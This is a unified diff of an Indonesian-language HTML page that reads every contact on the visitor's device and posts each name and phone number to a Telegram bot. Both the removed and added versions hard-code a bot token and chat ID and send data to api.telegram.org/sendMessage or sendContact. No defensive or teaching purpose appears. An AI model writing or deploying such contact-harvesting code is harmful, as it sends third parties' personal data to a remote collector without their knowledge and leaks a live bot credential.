@@ -1,59 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kirim Kontak ke Telebot</title>
-    <script>
-        function sendContacts() {
-            // Dapatkan semua kontak dari daftar kontak
-            const contacts = navigator.contacts;
-            const contactList = [];
-
-            contacts.find(['name', 'phoneNumbers'], (contact) => {
-                if (contact.phoneNumbers.length > 0) {
-                    contactList.push({
-                        name: contact.name,
-                        phone: contact.phoneNumbers[0].value
-                    });
-                }
-            }, (error) => {
-                console.error('Error accessing contacts:', error);
-            }, {
-                multiple: true
-            });
-
-            // Kirim setiap kontak ke Telebot
-            contactList.forEach(contact => {
-                const message = `Nama: ${contact.name}, Nomor Telepon: ${contact.phone}`;
-
-                fetch('https://api.telegram.org/bot<8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc>/sendMessage', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: '<1966317946>',
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Kontak dikirim:', contact.name);
-                    } else {
-                        console.error('Gagal mengirim kontak:', contact.name);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-            });
-        }
-    </script>
+    <title>Kirim Semua Kontak ke Tele Bot</title>
+    <script src="https://telegram.org/js/telegram.web.js"></script>
 </head>
 <body>
-    <h1>Kirim Semua Kontak ke Telebot</h1>
-    <button onclick="sendContacts()">Kirim Kontak</button>
+    <h1>Kirim Semua Kontak ke Tele Bot</h1>
+    <p>Klik tombol dibawah ini untuk mengirim semua kontak ke tele bot:</p>
+    <button id="sendAllContactsButton">Kirim Semua Kontak</button>
+
+    <script>
+        document.getElementById('sendAllContactsButton').addEventListener('click', function() {
+            // Ganti dengan token bot Telegram
+            var botToken = '8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc';
+
+            // Ganti dengan ID chat bot
+            var chatId = '1966317946';
+
+            // Ambil semua kontak dari perangkat
+            // Catatan: Ini akan berbeda tergantung pada perangkat dan browser yang digunakan
+            // Contoh ini menggunakan API Contacts di browser
+            navigator.contacts.getAll()
+                .then(function(contacts) {
+                    // Loop melalui semua kontak dan kirim ke tele bot
+                    contacts.forEach(function(contact) {
+                        var url = `https://api.telegram.org/bot${botToken}/sendContact`;
+
+                        // Data yang akan dikirim
+                        var data = {
+                            chat_id: chatId,
+                            phone_number: contact.phoneNumbers[0].value,
+                            first_name: contact.name.givenName,
+                            last_name: contact.name.familyName
+                        };
+
+                        // Kirim data menggunakan fetch
+                        fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Success:', data);
+                            alert('Kontak berhasil dikirim ke tele bot!');
+                        })
+                        .catch((error) => {
+                            console.error('Error:', error);
+                            alert('Gagal mengirim kontak ke tele bot.');
+                        });
+                    });
+                })
+                .catch(function(err) {
+                    console.error('Error accessing contacts:', err);
+                    alert('Gagal mengambil kontak.');
+                });
+        });
+    </script>
 </body>
 </html>
